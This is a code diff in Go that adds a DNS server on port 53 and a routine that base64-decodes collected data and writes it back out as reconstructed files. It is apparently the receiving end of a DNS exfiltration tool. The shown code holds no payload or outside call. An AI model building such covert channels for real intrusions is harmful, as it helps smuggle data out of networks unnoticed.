@@ -82,3 +82,37 @@ func saveFiles() {
 
         // Ensure proper padding
         if pad := len(b64) % 4; pad != 0 {
+            b64 += strings.Repeat("=", 4-pad)
+        }
+
+        decoded, err := base64.StdEncoding.DecodeString(b64)
+        if err != nil {
+            fmt.Printf("[-] Failed to decode base64 for %s: %s\n", filename, err)
+            continue
+        }
+
+        err = os.WriteFile(filename, decoded, 0644)
+        if err != nil {
+            fmt.Printf("[-] Failed to write file %s: %s\n", filename, err)
+        } else {
+            fmt.Printf("[+] Successfully reconstructed file: %s\n", filename)
+        }
+    }
+}
+
+func startServer() {
+    dns.HandleFunc(".", handleDNSRequest)
+    server := &dns.Server{Addr: ":53", Net: "udp"}
+    fmt.Println("[*] DNS server listening on port 53...")
+    if err := server.ListenAndServe(); err != nil {
+        fmt.Printf("[-] DNS server error: %s\n", err)
+        os.Exit(1)
+    }
+}
+
+func main() {
+    go startServer()
+    fmt.Println("[*] Press Enter to stop and save reconstructed files...")
+    fmt.Scanln()
+    saveFiles()
+}
